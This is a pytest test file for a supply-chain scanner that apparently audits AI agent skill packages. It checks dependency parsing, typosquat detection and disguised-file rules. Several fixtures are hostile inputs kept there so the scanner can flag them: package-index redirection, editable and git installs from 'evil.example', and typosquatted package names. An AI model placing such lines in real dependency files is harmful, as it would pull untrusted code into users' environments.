"""Phase 10: dependency parsing, SC1/SC6/SC10, and file-shape rules."""

from __future__ import annotations

from pathlib import Path

from skillguard.dependencies import (
    _edit_distance,
    collect_dependencies,
    parse_package_json,
    parse_pyproject,
    parse_requirements,
    typosquat_of,
)
from skillguard.discovery import discover
from skillguard.models import Component, ScanContext
from skillguard.nodes.analyzers.supply_chain_dependencies import supply_chain_dependencies
from skillguard.nodes.analyzers.supply_chain_files import supply_chain_files
from skillguard.state import ScanState

FIXTURES = Path(__file__).parent / "fixtures"


def _context(files: dict[str, tuple[str, str]]) -> ScanContext:
    return ScanContext(
        skill_path="/x",
        components=[Component(path=p, type=k) for p, (k, _t) in files.items()],
        file_cache={p: t for p, (_k, t) in files.items()},
    )


def _ids(context: ScanContext) -> list[str]:
    update = supply_chain_dependencies(ScanState(context=context))
    findings = update["findings"]
    assert isinstance(findings, list)
    return sorted(f.rule_id for f in findings)


# ------------------------------------------------------------------ parsing


def test_parses_pins_ranges_and_unpinned() -> None:
    deps, redirects = parse_requirements(
        "requests\nurllib3>=1.26\npyyaml==5.3.1\n", "requirements.txt"
    )

    assert [(d.name, d.version, d.specifier) for d in deps] == [
        ("requests", None, ""),
        ("urllib3", None, ">=1.26"),
        ("pyyaml", "5.3.1", "==5.3.1"),
    ]
    assert redirects == []


def test_parses_extras_and_comments() -> None:
    deps, _ = parse_requirements(
        "requests[security]==2.31.0  # needed\n\n# a comment\n", "requirements.txt"
    )

    assert [(d.name, d.version) for d in deps] == [("requests", "2.31.0")]


def test_flags_index_redirection() -> None:
    _, redirects = parse_requirements(
        "--index-url https://evil.example/simple\n--extra-index-url https://x/simple\n",
        "requirements.txt",
    )

    assert [r.reason for r in redirects] == ["custom package index", "custom package index"]


def test_flags_editable_and_url_installs() -> None:
    _, redirects = parse_requirements(
        "-e git+https://evil.example/repo.git#egg=thing\nthing @ https://evil.example/thing.whl\n",
        "requirements.txt",
    )

    assert len(redirects) == 2


def test_parses_pyproject_pep621() -> None:
    text = (
        "[project]\n"
        'name = "demo"\n'
        'dependencies = ["requests>=2", "pyyaml==5.3.1"]\n'
        "\n[project.optional-dependencies]\n"
        'dev = ["pytest"]\n'
    )

    deps, _ = parse_pyproject(text, "pyproject.toml")

    assert {(d.name, d.version) for d in deps} == {
        ("requests", None),
        ("pyyaml", "5.3.1"),
        ("pytest", None),
    }


def test_parses_pyproject_poetry() -> None:
    text = (
        "[tool.poetry.dependencies]\n"
        'python = "^3.12"\n'
        'requests = "^2.31"\n'
        'pyyaml = { version = "5.3.1" }\n'
        'evil = { git = "https://evil.example/repo.git" }\n'
    )

    deps, redirects = parse_pyproject(text, "pyproject.toml")

    assert {d.name for d in deps} == {"requests", "pyyaml"}
    assert "python" not in {d.name for d in deps}
    assert len(redirects) == 1


def test_parses_package_json() -> None:
    text = (
        '{"dependencies": {"lodash": "4.17.15", "left-pad": "^1.0.0"},'
        ' "devDependencies": {"jest": "*"}}'
    )

    deps, redirects = parse_package_json(text, "package.json")

    assert {(d.name, d.version, d.specifier) for d in deps} == {
        ("lodash", "4.17.15", "4.17.15"),
        ("left-pad", None, "^1.0.0"),
        ("jest", None, ""),
    }
    assert redirects == []


def test_package_json_url_dependency_is_redirected() -> None:
    text = '{"dependencies": {"evil": "git+https://evil.example/x.git"}}'

    deps, redirects = parse_package_json(text, "package.json")

    assert deps == []
    assert len(redirects) == 1


def test_broken_dependency_files_are_ignored() -> None:
    assert parse_pyproject("not = valid = toml", "pyproject.toml") == ([], [])
    assert parse_package_json("{not json", "package.json") == ([], [])


# -------------------------------------------------------------- typosquatting


def test_edit_distance_counts_a_transposition_as_one() -> None:
    assert _edit_distance("reqeusts", "requests") == 1
    assert _edit_distance("requests", "requests") == 0
    assert _edit_distance("flask", "django") > 2


def test_known_typosquats_are_detected() -> None:
    assert typosquat_of("reqeusts") == "requests"
    assert typosquat_of("urlib3") == "urllib3"
    assert typosquat_of("pyyalm") == "pyyaml"


def test_real_packages_are_not_typosquats() -> None:
    assert typosquat_of("requests") is None
    assert typosquat_of("flask") is None
    assert typosquat_of("pytest-cov") is None
    assert typosquat_of("ab") is None


# ------------------------------------------------------------------- SC rules


def test_fixture_yields_sc1_sc6_and_sc10() -> None:
    context = discover(str(FIXTURES / "supply_chain_skill"), max_files=50, max_file_bytes=100_000)

    ids = _ids(context)

    assert ids.count("SC1") == 2  # requests and reqeusts
    assert "SC6" in ids
    assert "SC10" in ids


def test_pinned_dependency_is_not_sc1() -> None:
    context = _context({"requirements.txt": ("requirements", "pyyaml==5.3.1\n")})

    assert "SC1" not in _ids(context)


def test_dependency_report_collects_all_file_kinds() -> None:
    context = _context(
        {
            "requirements.txt": ("requirements", "requests\n"),
            "pyproject.toml": ("toml", '[project]\ndependencies = ["flask"]\n'),
            "package.json": ("json", '{"dependencies": {"lodash": "4.17.15"}}'),
        }
    )

    report = collect_dependencies(context)

    assert {d.name for d in report.dependencies} == {"requests", "flask", "lodash"}


# ------------------------------------------------------- SC8 and SC9


def _file_ids(root: Path) -> list[str]:
    context = discover(str(root), max_files=50, max_file_bytes=100_000)
    update = supply_chain_files(ScanState(context=context))
    findings = update["findings"]
    assert isinstance(findings, list)
    return sorted(f.rule_id for f in findings)


def test_shipped_bytecode_directory_is_sc8(tmp_path: Path) -> None:
    skill = tmp_path / "skill"
    (skill / "__pycache__").mkdir(parents=True)
    (skill / "__pycache__" / "mod.cpython-312.pyc").write_bytes(b"\x00\x01")

    assert "SC8" in _file_ids(skill)


def test_loose_pyc_file_is_sc8(tmp_path: Path) -> None:
    skill = tmp_path / "skill"
    skill.mkdir()
    (skill / "mod.pyc").write_bytes(b"\x00\x01")

    assert "SC8" in _file_ids(skill)


def test_disguised_executable_is_sc9(tmp_path: Path) -> None:
    skill = tmp_path / "skill"
    skill.mkdir()
    (skill / "logo.png.py").write_text("print('hi')\n", encoding="utf-8")

    assert "SC9" in _file_ids(skill)


def test_ordinary_python_file_is_not_sc9(tmp_path: Path) -> None:
    skill = tmp_path / "skill"
    skill.mkdir()
    (skill / "helper.py").write_text("print('hi')\n", encoding="utf-8")

    assert _file_ids(skill) == []


def test_clean_skill_has_no_supply_chain_file_findings(tmp_path: Path) -> None:
    skill = tmp_path / "skill"
    (skill / "scripts").mkdir(parents=True)
    (skill / "scripts" / "format.py").write_text("x = 1\n", encoding="utf-8")

    assert _file_ids(skill) == []


def test_dependency_node_needs_a_context() -> None:
    assert supply_chain_dependencies(ScanState()) == {"findings": []}
    assert supply_chain_files(ScanState()) == {"findings": []}
